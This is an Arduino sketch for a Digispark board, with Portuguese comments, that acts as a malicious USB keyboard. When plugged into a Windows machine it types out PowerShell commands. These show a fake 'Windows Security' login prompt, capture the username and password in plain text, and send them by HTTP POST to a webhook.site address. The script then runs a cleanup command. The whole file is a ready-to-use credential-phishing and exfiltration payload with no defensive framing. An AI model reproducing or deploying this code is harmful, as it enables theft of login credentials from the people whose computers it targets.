#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000); // Ajustado para 2 segundos

  // Abre o "Executar" (Win + R) para iniciar o PowerShell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Abrir "Executar"
  DigiKeyboard.delay(100);  // Pequeno atraso para abrir o "Executar"
  
  // Inicia o PowerShell e ajusta a janela
  DigiKeyboard.println("powershell -noexit -command \"mode con cols=30 lines=10\""); // Janela um pouco maior para visibilidade
  DigiKeyboard.delay(500); // Reduzido para 500 ms
  
  // Atraso de espera para dar tempo ao PowerShell carregar
  DigiKeyboard.println(F("Start-Sleep -s 5"));
  DigiKeyboard.delay(500); // Reduzido para 500 ms

  // Comandos PowerShell adicionais
  DigiKeyboard.println(F("Add-Type -AssemblyName System.DirectoryServices.AccountManagement"));
  DigiKeyboard.delay(500); // Atraso mais curto
  
  DigiKeyboard.println(F("$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)"));
  DigiKeyboard.delay(500);
  
  // Solicita as credenciais do usuário
  DigiKeyboard.println(F("$credential = $host.ui.PromptForCredential(\"Windows Security\", \"Enter your credentials\", \"\", \"\")"));
  DigiKeyboard.delay(20000);  // Reduzido para 20 s
  
  // Espera até que o usuário insira as credenciais e clique em "OK"
  DigiKeyboard.println(F("Start-Sleep -s 10"));  // Dá tempo para o usuário inserir as credenciais e clicar "OK"
  
  // Extrai as credenciais inseridas
  DigiKeyboard.println(F("$creds = $credential.GetNetworkCredential()"));
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("[String]$user = $creds.username"));
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("[String]$pass = $creds.password"));
  DigiKeyboard.delay(500);
  
  // Cria a string com os dados
  DigiKeyboard.println(F("$userpass = \"Username: \" + $user + \" Password: \" + $pass"));
  DigiKeyboard.delay(500);

  // Envia os dados para o Webhook
  DigiKeyboard.println(F("Invoke-WebRequest -Uri \"https://webhook.site/ec44306a-36b5-474f-82d4-b8bbf63e2d17\" -Method POST -Body $userpass"));
  DigiKeyboard.delay(500); // Atraso mais curto para enviar os dados
  
  // Finaliza a execução do script
  DigiKeyboard.println(F("break"));
  DigiKeyboard.delay(500);

  // Limpeza de arquivos temporários
  DigiKeyboard.println(F("Remove-Item -Path \"$env:temp\\rake\""));
  DigiKeyboard.delay(200);

  // Acende o LED quando o programa terminar
  digitalWrite(1, HIGH);  // Liga o LED
  DigiKeyboard.delay(90000); // Espera para dar tempo de ver o LED aceso
  digitalWrite(1, LOW);   // Desliga o LED
  DigiKeyboard.delay(5000); // Espera antes de reiniciar
}
